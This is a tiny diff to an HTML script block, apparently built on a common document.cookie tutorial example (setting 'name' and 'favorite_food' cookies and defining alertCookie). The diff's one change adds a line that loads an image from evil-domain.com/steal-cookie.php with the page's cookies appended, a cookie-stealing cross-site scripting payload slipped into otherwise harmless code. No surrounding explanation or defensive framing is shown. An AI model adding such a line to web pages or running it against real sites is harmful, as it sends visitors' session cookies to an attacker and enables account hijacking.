@@ -1,5 +1,5 @@
 <script> 
-  
+  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 document.cookie = "name=oeschger";
 document.cookie = "favorite_food=tripe";
 function alertCookie() {
